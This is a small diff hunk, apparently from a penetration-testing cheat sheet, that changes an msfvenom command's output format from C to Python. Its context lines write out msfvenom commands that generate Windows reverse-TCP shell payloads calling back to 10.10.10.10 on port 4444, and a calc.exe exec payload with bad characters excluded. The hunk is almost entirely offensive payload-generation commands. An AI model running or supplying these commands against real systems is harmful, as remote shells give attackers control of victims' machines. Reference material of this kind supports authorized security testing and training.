@@ -36,7 +36,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -v shel
 msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -n 10
 
 # Create a cmd payload
-msfvenom -p windows/exec cmd=calc.exe -f c --platform Windows -a x86 -b "\x00\x0a\x0d"
+msfvenom -p windows/exec cmd=calc.exe -f py --platform Windows -a x86 -b "\x00\x0a\x0d"
 
 
 # Multi handler
